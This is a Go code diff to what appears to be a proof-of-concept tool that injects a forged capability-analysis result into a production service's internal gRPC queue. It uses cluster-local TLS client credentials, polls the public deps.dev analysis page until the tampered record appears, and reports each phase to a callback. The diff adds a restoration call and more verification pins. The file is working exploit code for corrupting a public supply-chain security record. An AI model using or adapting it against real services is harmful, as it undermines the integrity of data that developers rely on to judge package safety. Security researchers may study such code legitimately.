@@ -41,7 +41,9 @@ const (
 	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.8"
 	queueName        = "capslock-capability-result"
 	mutationSource   = "robert-owned-v127-capability-suppression"
+	restoreSource    = "robert-owned-v127-capability-restore"
 	queueMethod      = "/sos.queue.Queue/Push"
+	restoreMethod    = "/sos.talisman.Talisman/Refresh"
 	serviceHost      = "talisman-core.default.svc.cluster.local"
 	servicePort      = 9000
 	tlsServerName    = "localhost"
@@ -49,10 +51,13 @@ const (
 	analysisURL = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.8/analysis"
 	// cleanSHA256 is intentionally locked until production has returned the
 	// immutable v0.0.8 module's legitimate non-empty record for 21 samples.
-	cleanSHA256        = "0000000000000000000000000000000000000000000000000000000000000000"
+	cleanSHA256        = "f87d65c5252bd2ffea49dd6f3f76a68165d117ef20053d762af68d172c6f5923"
 	mutatedSHA256      = "14d798f2aadfed6f6a1eb6951221daa65d5e132d402cf9fa35952c0adc9857dd"
 	mutationPushBytes  = 144
 	mutationPushSHA256 = "23514124b033afbbaedcf2777a839cd3adf9135aaf919d420eea79f9439f3873"
+	restoreFrameBytes  = 103
+	restoreFrameSHA256 = "917e77ef9ffd6c1b77633d285ccbf42d11f78f54650d0a4630c5593a82914912"
+	emptyFrameSHA256   = "8855508aade16ec573d21e6a485dfd0a7624085c1a14b5ecdd6485de0c6839a4"
 
 	clientCertificatePath = "/etc/tls/client/tls.crt"
 	clientKeyPath         = "/etc/tls/client/tls.key"
@@ -125,6 +130,7 @@ type grpcMetadata struct {
 
 type queueReceipt struct {
 	Attempted          bool         `json:"attempted"`
+	RequestDispatched  bool         `json:"request_dispatched"`
 	Method             string       `json:"method"`
 	Queue              string       `json:"queue"`
 	Source             string       `json:"source"`
@@ -147,6 +153,27 @@ type queueReceipt struct {
 	StartedUTC         string       `json:"started_utc,omitempty"`
 	FinishedUTC        string       `json:"finished_utc,omitempty"`
 	DurationMS         int64        `json:"duration_ms,omitempty"`
+}
+
+type refreshReceipt struct {
+	Attempted         bool         `json:"attempted"`
+	Method            string       `json:"method"`
+	Source            string       `json:"source"`
+	Target            string       `json:"target"`
+	RequestBytes      int          `json:"request_bytes"`
+	RequestSHA256     string       `json:"request_sha256"`
+	HTTPStatus        int          `json:"http_status,omitempty"`
+	ContentType       string       `json:"content_type,omitempty"`
+	GRPCStatusHeader  grpcMetadata `json:"grpc_status_header"`
+	GRPCStatusTrailer grpcMetadata `json:"grpc_status_trailer"`
+	ResponseBytes     int          `json:"response_bytes,omitempty"`
+	ResponseSHA256    string       `json:"response_sha256,omitempty"`
+	ResponseFrames    int          `json:"response_frames,omitempty"`
+	Verified          bool         `json:"verified"`
+	Error             string       `json:"error,omitempty"`
+	StartedUTC        string       `json:"started_utc,omitempty"`
+	FinishedUTC       string       `json:"finished_utc,omitempty"`
+	DurationMS        int64        `json:"duration_ms,omitempty"`
 }
 
 type convergenceReceipt struct {
@@ -181,6 +208,12 @@ type report struct {
 	MutationPublic           convergenceReceipt `json:"mutation_public"`
 	MutationPublicSHA256     string             `json:"mutation_public_report_sha256,omitempty"`
 	MutationPublicCallbackOK bool               `json:"mutation_public_callback_ok"`
+	Restoration              refreshReceipt     `json:"restoration"`
+	RestorationSHA256        string             `json:"restoration_report_sha256,omitempty"`
+	RestorationCallbackOK    bool               `json:"restoration_callback_ok"`
+	RestorationPublic        convergenceReceipt `json:"restoration_public"`
+	RestorationPublicSHA256  string             `json:"restoration_public_report_sha256,omitempty"`
+	RestorationPublicOK      bool               `json:"restoration_public_callback_ok"`
 	Outcome                  string             `json:"outcome"`
 	Error                    string             `json:"error,omitempty"`
 }
@@ -213,8 +246,10 @@ func main() {
 		ExpectedMutatedSHA256: mutatedSHA256, ExpectedCleanSHA256: cleanSHA256,
 		StartedUTC: started.UTC().Format(time.RFC3339Nano),
 		Identity:   inspectIdentity(origin), Precheck: []publicSample{},
-		Mutation:       emptyQueueReceipt(mutationSource),
-		MutationPublic: emptyConvergenceReceipt("mutated"),
+		Mutation:          emptyQueueReceipt(mutationSource),
+		MutationPublic:    emptyConvergenceReceipt("mutated"),
+		Restoration:       emptyRefreshReceipt(),
+		RestorationPublic: emptyConvergenceReceipt("clean"),
 	}
 
 	certIdentity, certErr := readClientCertificateIdentity()
@@ -261,6 +296,12 @@ func main() {
 	mutationReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
 	receipt.MutationReportSHA256, err = submitPhase("mutation_queue", mutationReport)
 	receipt.MutationCallbackOK = err == nil
+	if !receipt.Mutation.RequestDispatched {
+		receipt.Outcome = "mutation_not_dispatched"
+		receipt.Error = firstNonempty(receipt.Mutation.Error, "queue_request_not_dispatched")
+		finishAndSubmit(&receipt)
+		return
+	}
 
 	receipt.MutationPublic = runConvergence("mutated", precheckSamples)
 	mutationPublicReport := receipt
@@ -269,17 +310,44 @@ func main() {
 	receipt.MutationPublicSHA256, err = submitPhase("mutation_public", mutationPublicReport)
 	receipt.MutationPublicCallbackOK = err == nil
 
-	if receipt.Mutation.Verified && receipt.MutationCallbackOK && receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK {
-		receipt.Outcome = "owned_capability_suppression_verified"
-	} else {
-		receipt.Outcome = "capability_suppression_not_verified"
-		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error)
+	receipt.Restoration = runRefresh(buildRefreshFrame())
+	restorationReport := receipt
+	restorationReport.Phase = "restore_refresh"
+	restorationReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	receipt.RestorationSHA256, err = submitPhase("restore_refresh", restorationReport)
+	receipt.RestorationCallbackOK = err == nil
+
+	restoreOffset := precheckSamples + receipt.MutationPublic.TotalSamples
+	receipt.RestorationPublic = runConvergence("clean", restoreOffset)
+	restorationPublicReport := receipt
+	restorationPublicReport.Phase = "restore_public"
+	restorationPublicReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	receipt.RestorationPublicSHA256, err = submitPhase("restore_public", restorationPublicReport)
+	receipt.RestorationPublicOK = err == nil
+
+	suppressionVerified := receipt.Mutation.Verified && receipt.MutationCallbackOK &&
+		receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK
+	restorationVerified := receipt.Restoration.Verified && receipt.RestorationCallbackOK &&
+		receipt.RestorationPublic.Converged && receipt.RestorationPublicOK
+	switch {
+	case suppressionVerified && restorationVerified:
+		receipt.Outcome = "owned_capability_suppression_and_restoration_verified"
+	case restorationVerified:
+		receipt.Outcome = "capability_suppression_not_verified_but_restored"
+		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error, "suppression_receipt_incomplete")
+	default:
+		receipt.Outcome = "restoration_not_verified"
+		receipt.Error = firstNonempty(receipt.Restoration.Error, receipt.RestorationPublic.Error, "restoration_receipt_incomplete")
 	}
 	finishAndSubmit(&receipt)
 }
 
 func emptyQueueReceipt(source string) queueReceipt {
 	return queueReceipt{Method: queueMethod, Queue: queueName, Source: source, Target: targetCoordinate}
+}
+
+func emptyRefreshReceipt() refreshReceipt {
+	return refreshReceipt{Method: restoreMethod, Source: restoreSource, Target: targetCoordinate}
 }
 
 func emptyConvergenceReceipt(state string) convergenceReceipt {
@@ -316,12 +384,15 @@ func validNonce(value string) bool {
 func validateStaticPins() error {
 	zero := strings.Repeat("0", 64)
 	if cleanSHA256 == zero || mutatedSHA256 == zero || cleanSHA256 == mutatedSHA256 ||
-		mutationPushBytes <= 0 || mutationPushSHA256 == zero {
+		mutationPushBytes <= 0 || mutationPushSHA256 == zero || restoreFrameBytes <= 0 || restoreFrameSHA256 == zero {
 		return errors.New("suppression pins incomplete")
 	}
 	mutation, err := buildMutationPush()
 	if err != nil || !matchesRequestPin(mutation, mutationPushBytes, mutationPushSHA256) {
 		return errors.New("mutation request pin mismatch")
+	}
+	if !matchesRequestPin(buildRefreshFrame(), restoreFrameBytes, restoreFrameSHA256) {
+		return errors.New("restoration request pin mismatch")
 	}
 	return nil
 }
@@ -455,8 +526,8 @@ func runConvergence(expectedState string, sequenceOffset int) convergenceReceipt
 		if err != nil || (sample.State != "clean" && sample.State != "mutated") {
 			result.ExactStreak = 0
 			result.FinalBody, result.FinalSHA256 = "", ""
-			result.Error = "public_convergence_failed"
-			return result
+			time.Sleep(pollInterval)
+			continue
 		}
 		if sample.State == expectedState {
 			result.ExactStreak++
@@ -575,6 +646,73 @@ func buildMutationPush() ([]byte, error) {
 	return buildQueuePush(mutationSource, action), nil
 }
 
+func buildRefreshFrame() []byte {
+	capability := appendStringField(nil, 1, targetCoordinate)
+	capability = appendStringField(capability, 2, restoreSource)
+	request := appendBytesField(nil, 2, capability)
+	return grpcFrame(request)
+}
+
+func runRefresh(body []byte) (result refreshReceipt) {
+	started := time.Now()
+	result = emptyRefreshReceipt()
+	result.Attempted, result.StartedUTC = true, started.UTC().Format(time.RFC3339Nano)
+	defer func() {
+		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+		result.DurationMS = time.Since(started).Milliseconds()
+	}()
+	digest := sha256.Sum256(body)
+	result.RequestBytes, result.RequestSHA256 = len(body), hex.EncodeToString(digest[:])
+	if !matchesRequestPin(body, restoreFrameBytes, restoreFrameSHA256) {
+		result.Error = "refresh_request_pin_mismatch"
+		return
+	}
+	client, endpoint, err := newInternalClient()
+	if err != nil {
+		result.Error = "internal_client_failed"
+		return
+	}
+	defer client.CloseIdleConnections()
+	ctx, cancel := context.WithTimeout(context.Background(), internalTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+restoreMethod, bytes.NewReader(body))
+	if err != nil {
+		result.Error = "refresh_request_failed"
+		return
+	}
+	request.Header.Set("Content-Type", "application/grpc")
+	request.Header.Set("TE", "trailers")
+	request.Header.Set("Grpc-Timeout", "30S")
+	request.Header.Set("User-Agent", expectedAgent)
+	response, err := client.Do(request)
+	if err != nil {
+		result.Error = "refresh_transport_ambiguous_no_retry"
+		return
+	}
+	defer response.Body.Close()
+	result.HTTPStatus, result.ContentType = response.StatusCode, response.Header.Get("Content-Type")
+	result.GRPCStatusHeader = captureGRPCMetadata(response.Header, "Grpc-Status")
+	responseBody, err := io.ReadAll(io.LimitReader(response.Body, maximumGRPCBody+1))
+	if err != nil || len(responseBody) > maximumGRPCBody {
+		result.Error = "refresh_response_oversize_or_unreadable"
+		return
+	}
+	result.GRPCStatusTrailer = captureGRPCMetadata(response.Trailer, "Grpc-Status")
+	result.ResponseBytes = len(responseBody)
+	responseDigest := sha256.Sum256(responseBody)
+	result.ResponseSHA256 = hex.EncodeToString(responseDigest[:])
+	result.ResponseFrames, _ = countGRPCFrames(responseBody)
+	if response.StatusCode != http.StatusOK || strings.TrimSpace(strings.ToLower(result.ContentType)) != "application/grpc" ||
+		!exactZeroGRPCStatus(result.GRPCStatusHeader, result.GRPCStatusTrailer) ||
+		!bytes.Equal(responseBody, []byte{0, 0, 0, 0, 0}) || result.ResponseSHA256 != emptyFrameSHA256 ||
+		result.ResponseFrames != 1 {
+		result.Error = "refresh_response_not_exact"
+		return
+	}
+	result.Verified = true
+	return
+}
+
 // encodeCapabilityResultAction encodes only the exact v125 production outer
 // schema. It deliberately treats each map value as opaque bytes.
 func encodeCapabilityResultAction(packageVersion string, capabilities []capabilityMapEntry, errorText string) ([]byte, error) {
@@ -636,6 +774,7 @@ func runQueuePush(body []byte, source string, expectedBytes int, expectedSHA256 
 	request.Header.Set("TE", "trailers")
 	request.Header.Set("Grpc-Timeout", "30S")
 	request.Header.Set("User-Agent", expectedAgent)
+	result.RequestDispatched = true
 	response, err := client.Do(request)
 	if err != nil {
 		result.Error = "queue_transport_failed"
@@ -788,7 +927,7 @@ func verifyInternalPeer(state tls.ConnectionState, roots *x509.CertPool) error {
 
 func validCallbackPhase(phase string) bool {
 	switch phase {
-	case "preflight", "mutation_queue", "mutation_public", "final":
+	case "preflight", "mutation_queue", "mutation_public", "restore_refresh", "restore_public", "final":
 		return true
 	default:
 		return false
